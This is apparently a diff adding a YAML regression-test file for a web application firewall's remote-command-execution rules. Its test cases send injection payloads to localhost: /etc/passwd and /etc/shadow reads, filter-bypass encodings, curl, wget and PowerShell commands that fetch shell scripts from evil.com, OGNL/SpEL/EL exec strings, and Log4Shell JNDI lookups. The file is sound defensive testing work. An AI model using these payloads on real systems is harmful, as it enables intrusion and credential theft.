@@ -1,0 +1,449 @@
+---
+meta:
+  author: "Security Engineer"
+  description: "Comprehensive RCE payload testing"
+  enabled: true
+  name: "932-rce-comprehensive.yaml"
+tests:
+  - test_id: 932100
+    desc: "Unix command injection with semicolon"
+    stages:
+      - stage:
+          input:
+            dest_addr: "127.0.0.1"
+            method: "GET"
+            port: 80
+            headers:
+              User-Agent: "Mozilla/5.0"
+              Host: "localhost"
+            uri: "/search?q=test;id"
+          output:
+            log_contains: "id"
+  - test_id: 932101
+    desc: "Unix command injection with pipe and cat"
+    stages:
+      - stage:
+          input:
+            dest_addr: "127.0.0.1"
+            method: "POST"
+            port: 80
+            headers:
+              Content-Type: "application/x-www-form-urlencoded"
+              Host: "localhost"
+            uri: "/upload"
+            data: "file=test|cat /etc/passwd"
+          output:
+            log_contains: "cat"
+  - test_id: 932102
+    desc: "Backtick command execution"
+    stages:
+      - stage:
+          input:
+            dest_addr: "127.0.0.1"
+            method: "GET"
+            port: 80
+            headers:
+              User-Agent: "`whoami`"
+              Host: "localhost"
+            uri: "/"
+          output:
+            log_contains: "whoami"
+  - test_id: 932103
+    desc: "Windows command injection with ampersand"
+    stages:
+      - stage:
+          input:
+            dest_addr: "127.0.0.1"
+            method: "GET"
+            port: 80
+            headers:
+              Host: "localhost"
+            uri: "/cmd.php?cmd=ping& dir"
+          output:
+            log_contains: "dir"
+  - test_id: 932104
+    desc: "Windows command injection with pipe type"
+    stages:
+      - stage:
+          input:
+            dest_addr: "127.0.0.1"
+            method: "POST"
+            port: 80
+            headers:
+              Content-Type: "application/x-www-form-urlencoded"
+              Host: "localhost"
+            uri: "/login"
+            data: "user=admin| type C:\\Windows\\win.ini"
+          output:
+            log_contains: "type"
+  - test_id: 932105
+    desc: "Windows command injection with semicolon net user"
+    stages:
+      - stage:
+          input:
+            dest_addr: "127.0.0.1"
+            method: "GET"
+            port: 80
+            headers:
+              Cookie: "sessionid=123; net user"
+              Host: "localhost"
+            uri: "/"
+          output:
+            log_contains: "net user"
+  - test_id: 932106
+    desc: "Unix subshell execution substitution"
+    stages:
+      - stage:
+          input:
+            dest_addr: "127.0.0.1"
+            method: "GET"
+            port: 80
+            headers:
+              Host: "localhost"
+            uri: "/api?v=$(whoami)"
+          output:
+            log_contains: "whoami"
+  - test_id: 932107
+    desc: "Pipe injection ls -la"
+    stages:
+      - stage:
+          input:
+            dest_addr: "127.0.0.1"
+            method: "GET"
+            port: 80
+            headers:
+              Host: "localhost"
+              Referer: "http://example.com/| ls -la"
+            uri: "/"
+          output:
+            log_contains: "ls -la"
+  - test_id: 932108
+    desc: "Semicolon chaining cat shadow"
+    stages:
+      - stage:
+          input:
+            dest_addr: "127.0.0.1"
+            method: "POST"
+            port: 80
+            headers:
+              Content-Type: "application/json"
+              Host: "localhost"
+            uri: "/api/config"
+            data: '{"setting":"value;cat /etc/shadow"}'
+          output:
+            log_contains: "cat"
+  - test_id: 932109
+    desc: "Newline injection"
+    stages:
+      - stage:
+          input:
+            dest_addr: "127.0.0.1"
+            method: "GET"
+            port: 80
+            headers:
+              Host: "localhost"
+            uri: "/run?cmd=start%0aid"
+          output:
+            log_contains: "id"
+  - test_id: 932110
+    desc: "Wildcard bypass cat passwd"
+    stages:
+      - stage:
+          input:
+            dest_addr: "127.0.0.1"
+            method: "GET"
+            port: 80
+            headers:
+              Host: "localhost"
+            uri: "/exec?cmd=/bin/c?t%20/etc/p?sswd"
+          output:
+            log_contains: "c?t"
+  - test_id: 932111
+    desc: "Deep wildcard bypass"
+    stages:
+      - stage:
+          input:
+            dest_addr: "127.0.0.1"
+            method: "GET"
+            port: 80
+            headers:
+              Host: "localhost"
+            uri: "/exec?cmd=/???/??t%20/???/p??swd"
+          output:
+            log_contains: "??t"
+  - test_id: 932112
+    desc: "Variable expansion PATH"
+    stages:
+      - stage:
+          input:
+            dest_addr: "127.0.0.1"
+            method: "POST"
+            port: 80
+            headers:
+              Content-Type: "application/x-www-form-urlencoded"
+              Host: "localhost"
+            uri: "/test"
+            data: "input=$PATH"
+          output:
+            log_contains: "PATH"
+  - test_id: 932113
+    desc: "Variable expansion IFS bypass"
+    stages:
+      - stage:
+          input:
+            dest_addr: "127.0.0.1"
+            method: "GET"
+            port: 80
+            headers:
+              Host: "localhost"
+            uri: "/run?cmd=cat${IFS}/etc/passwd"
+          output:
+            log_contains: "IFS"
+  - test_id: 932114
+    desc: "Bash brace expansion"
+    stages:
+      - stage:
+          input:
+            dest_addr: "127.0.0.1"
+            method: "GET"
+            port: 80
+            headers:
+              Host: "localhost"
+            uri: "/run?cmd={cat,/etc/passwd}"
+          output:
+            log_contains: "cat"
+  - test_id: 932115
+    desc: "Base64 encoded commands"
+    stages:
+      - stage:
+          input:
+            dest_addr: "127.0.0.1"
+            method: "POST"
+            port: 80
+            headers:
+              Content-Type: "application/x-www-form-urlencoded"
+              Host: "localhost"
+            uri: "/run"
+            data: "cmd=echo dGVzdA== | base64 -d | bash"
+          output:
+            log_contains: "base64"
+  - test_id: 932116
+    desc: "Hex encoded commands"
+    stages:
+      - stage:
+          input:
+            dest_addr: "127.0.0.1"
+            method: "GET"
+            port: 80
+            headers:
+              Host: "localhost"
+            uri: "/run?cmd=$'\\x63\\x61\\x74'"
+          output:
+            log_contains: "\\x63"
+  - test_id: 932117
+    desc: "Concatenation bypass"
+    stages:
+      - stage:
+          input:
+            dest_addr: "127.0.0.1"
+            method: "GET"
+            port: 80
+            headers:
+              Host: "localhost"
+            uri: "/run?cmd=c''a''t /etc/passwd"
+          output:
+            log_contains: "c''a''t"
+  - test_id: 932118
+    desc: "Env variable bypass"
+    stages:
+      - stage:
+          input:
+            dest_addr: "127.0.0.1"
+            method: "GET"
+            port: 80
+            headers:
+              Host: "localhost"
+              X-Forwarded-For: "$u$n$a$m$e -a"
+            uri: "/"
+          output:
+            log_contains: "$u$n$a$m$e"
+  - test_id: 932119
+    desc: "Rev command bypass"
+    stages:
+      - stage:
+          input:
+            dest_addr: "127.0.0.1"
+            method: "POST"
+            port: 80
+            headers:
+              Content-Type: "application/x-www-form-urlencoded"
+              Host: "localhost"
+            uri: "/eval"
+            data: "cmd=echo 'tac' | rev"
+          output:
+            log_contains: "rev"
+  - test_id: 932120
+    desc: "Python one-liner"
+    stages:
+      - stage:
+          input:
+            dest_addr: "127.0.0.1"
+            method: "GET"
+            port: 80
+            headers:
+              Host: "localhost"
+            uri: "/run?cmd=python -c 'import os; os.system(\"id\")'"
+          output:
+            log_contains: "python"
+  - test_id: 932121
+    desc: "Perl one-liner"
+    stages:
+      - stage:
+          input:
+            dest_addr: "127.0.0.1"
+            method: "GET"
+            port: 80
+            headers:
+              Host: "localhost"
+            uri: "/run?cmd=perl -e 'exec \"id\";'"
+          output:
+            log_contains: "perl"
+  - test_id: 932122
+    desc: "Ruby one-liner"
+    stages:
+      - stage:
+          input:
+            dest_addr: "127.0.0.1"
+            method: "GET"
+            port: 80
+            headers:
+              Host: "localhost"
+            uri: "/run?cmd=ruby -e 'exec \"id\"'"
+          output:
+            log_contains: "ruby"
+  - test_id: 932123
+    desc: "Curl command injection"
+    stages:
+      - stage:
+          input:
+            dest_addr: "127.0.0.1"
+            method: "GET"
+            port: 80
+            headers:
+              Host: "localhost"
+            uri: "/ping?host=127.0.0.1;curl http://evil.com/shell.sh | bash"
+          output:
+            log_contains: "curl"
+  - test_id: 932124
+    desc: "Wget command injection"
+    stages:
+      - stage:
+          input:
+            dest_addr: "127.0.0.1"
+            method: "GET"
+            port: 80
+            headers:
+              Host: "localhost"
+            uri: "/ping?host=127.0.0.1;wget http://evil.com/shell.sh -O /tmp/shell.sh"
+          output:
+            log_contains: "wget"
+  - test_id: 932125
+    desc: "PowerShell IEX injection"
+    stages:
+      - stage:
+          input:
+            dest_addr: "127.0.0.1"
+            method: "POST"
+            port: 80
+            headers:
+              Content-Type: "application/json"
+              Host: "localhost"
+            uri: "/api/admin"
+            data: '{"cmd":"IEX(New-Object Net.WebClient).downloadString(''http://evil.com/shell.ps1'')"}'
+          output:
+            log_contains: "IEX"
+  - test_id: 932126
+    desc: "PowerShell Invoke-Expression injection"
+    stages:
+      - stage:
+          input:
+            dest_addr: "127.0.0.1"
+            method: "POST"
+            port: 80
+            headers:
+              Content-Type: "application/x-www-form-urlencoded"
+              Host: "localhost"
+            uri: "/admin"
+            data: "cmd=Invoke-Expression 'ping 127.0.0.1'"
+          output:
+            log_contains: "Invoke-Expression"
+  - test_id: 932127
+    desc: "OGNL injection Struts"
+    stages:
+      - stage:
+          input:
+            dest_addr: "127.0.0.1"
+            method: "GET"
+            port: 80
+            headers:
+              Host: "localhost"
+            uri: "/action?name=%24%7B%28%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23a%3D%40java.lang.Runtime%40getRuntime%28%29.exec%28%22id%22%29.getInputStream%28%29%2C%23b%3Dnew%20java.io.InputStreamReader%28%23a%29%2C%23c%3Dnew%20java.io.BufferedReader%28%23b%29%2C%23d%3Dnew%20char%5B50000%5D%2C%23c.read%28%23d%29%2C%23s%3Dnew%20java.lang.String%28%23d%29%2C%23out%3D%40org.apache.struts2.ServletActionContext%40getResponse%28%29.getWriter%28%29%2C%23out.println%28%23s%29%2C%23out.close%28%29%29%7D"
+          output:
+            log_contains: "memberAccess"
+  - test_id: 932128
+    desc: "SpEL injection Spring"
+    stages:
+      - stage:
+          input:
+            dest_addr: "127.0.0.1"
+            method: "POST"
+            port: 80
+            headers:
+              Content-Type: "application/json"
+              Host: "localhost"
+            uri: "/spring"
+            data: '{"expression":"T(java.lang.Runtime).getRuntime().exec(\"id\")"}'
+          output:
+            log_contains: "getRuntime"
+  - test_id: 932129
+    desc: "EL injection JSP"
+    stages:
+      - stage:
+          input:
+            dest_addr: "127.0.0.1"
+            method: "GET"
+            port: 80
+            headers:
+              Host: "localhost"
+            uri: "/index.jsp?msg=${Runtime.getRuntime().exec('id')}"
+          output:
+            log_contains: "Runtime"
+  - test_id: 932130
+    desc: "JNDI injection basic"
+    stages:
+      - stage:
+          input:
+            dest_addr: "127.0.0.1"
+            method: "GET"
+            port: 80
+            headers:
+              User-Agent: "${jndi:ldap://evil.com/a}"
+              Host: "localhost"
+            uri: "/"
+          output:
+            log_contains: "jndi:ldap"
+  - test_id: 932131
+    desc: "Log4Shell variant lower"
+    stages:
+      - stage:
+          input:
+            dest_addr: "127.0.0.1"
+            method: "POST"
+            port: 80
+            headers:
+              Content-Type: "application/json"
+              Host: "localhost"
+            uri: "/login"
+            data: '{"username":"${${lower:j}ndi:ldap://evil.com/a}","password":"pwd"}'
+          output:
+            log_contains: "lower:j"
